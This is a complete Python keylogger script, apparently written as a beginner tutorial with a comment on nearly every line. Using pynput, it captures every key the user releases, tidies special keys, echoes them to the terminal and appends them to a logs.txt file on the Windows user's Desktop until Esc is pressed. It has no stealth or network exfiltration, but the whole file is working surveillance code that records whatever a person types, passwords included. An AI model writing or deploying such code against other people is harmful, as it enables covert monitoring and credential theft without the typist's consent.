import os
from pynput import keyboard
from pynput.keyboard import Listener

count = 0 # sets a counter of the amount of keys pressed since they were last saved to the logs.txt file.
keys = [] # empty list for the keys which have been pressed.

def on_release(key): # function what to do when a key is released.
    global keys, count # sets the keys and count variables to be global (keep the same values throughout the script)
    print(key) # shows us the keys which have been pressed in the terminal. Not needed for the logs.txt file to work.

    if key == keyboard.Key.space:  # change Key.space in logs.txt file to an actual space.
        key = " "
    elif key == keyboard.Key.enter:  # change Key.enter in logs.txt file to a new line.
        key = """
"""
    elif key == keyboard.Key.backspace:  # change Key.backspace in logs.txt file to a '[BACKSPACE]'.
        key = "[BACKSPACE]"
    elif key == keyboard.Key.shift:  # remove Key.shift from the logs.txt file.
        key = ""
    elif key == keyboard.Key.shift_r:  # remove Key.shift from the logs.txt file.
        key = ""
    elif key == keyboard.Key.esc:  # stop the keylogger from running.
        return False


    keys.append(key) # add the key entered to the list of keys.
    count += 1 # after a key is pressed, add 1 to the counter.
    if count >= 1:  # set the frequency which the logs.txt file is updated.
        count = 0  # resets the counter to 0.
        write_file(keys)  # updates logs.txt file from list of keys.
        keys = []  # empties list of keys.


def write_file(keys): # function for writing keys to logs.txt file
    username = os.getlogin() # gets username so we can save logs regardless of the user.
    with open(f"C:\\Users\\{username}\\Desktop\\logs.txt", "a") as log: # 'with' only keeps the file open for as long as is needed.
        for key in keys:
            log.write(str(key).replace("'", "")) # writes the keys to file, while removing the '' before and after letters.


with Listener(on_release=on_release) as listener:
    listener.join() # starts Listener function from pynput, which listens for keys pressed.
